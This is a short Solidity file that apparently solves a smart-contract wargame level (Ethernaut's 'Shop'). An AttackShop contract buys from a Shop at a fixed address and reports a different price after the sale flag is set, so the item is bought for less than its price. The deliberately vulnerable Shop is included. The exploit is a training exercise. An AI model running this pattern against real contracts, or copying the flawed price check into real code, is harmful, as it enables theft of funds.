// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackShop {
    Shop level21 = Shop(0xaf50B508291DEa1FC9CbD3f4AfdB3e65aA5c1Ea8);

    function exploit() external {
        level21.buy();
    }

    function price() external view returns (uint) {
        return level21.isSold() ? 1 : 101;
    }
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}

interface Buyer {
    function price() external view returns (uint256);
}
